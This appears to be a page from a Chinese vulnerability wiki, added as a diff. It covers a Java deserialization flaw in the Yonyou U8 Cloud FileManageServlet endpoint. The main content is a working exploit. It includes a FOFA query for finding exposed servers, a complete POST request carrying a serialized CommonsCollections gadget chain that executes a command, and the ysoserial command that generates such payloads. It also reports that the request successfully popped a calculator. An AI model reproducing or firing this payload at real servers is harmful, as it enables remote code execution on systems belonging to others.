@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileManageServlet%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>用友U8 Cloud接口FileManageServlet存在反序列漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7528\u53cbU8-Cloud\u63a5\u53e3FileManageServlet\u5b58\u5728\u53cd\u5e8f\u5217\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友U8 Cloud接口FileServlet存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8BU8-Cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友U8 Cloud upload任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="u8-cloudfilemanageservlet">用友U8-Cloud接口FileManageServlet存在反序列漏洞<a class="headerlink" href="#u8-cloudfilemanageservlet" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;用友-U8-Cloud&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /servlet/~uap/nc.impl.pub.filesystem.FileManageServlet HTTP/1.1
+Host: 192.168.127.145:8088
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=1.9
+Content-Type: application/x-www-form-urlencoded
+
+
+{{unquote(&quot;\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x05sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x00\x11java.lang.Runtime\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimeur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\tgetMethoduq\x00~\x00\x1b\x00\x00\x00\x02vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpvq\x00~\x00\x1bsq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x02puq\x00~\x00\x18\x00\x00\x00\x00t\x00\x06invokeuq\x00~\x00\x1b\x00\x00\x00\x02vr\x00\x10java.lang.Object\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpvq\x00~\x00\x18sq\x00~\x00\x13ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x01t\x00\x04calct\x00\x04execuq\x00~\x00\x1b\x00\x00\x00\x01q\x00~\x00 sq\x00~\x00\x0fsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx&quot;)}}
+</code></pre></div>
+使用ysoserial生成payload 
+<div class="highlight"><pre><span></span><code>java -jar ysoserial.jar CommonsCollections6 &quot;calc&quot; &gt; 1.txt
+</code></pre></div></p>
+<p>使用yakit发包，成功弹出计算器</p>
+<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/21dfbaab-7687-45b4-b171-722aad3e759b" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友U8 Cloud接口FileServlet存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8BU8-Cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8BU8-Cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友U8 Cloud upload任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
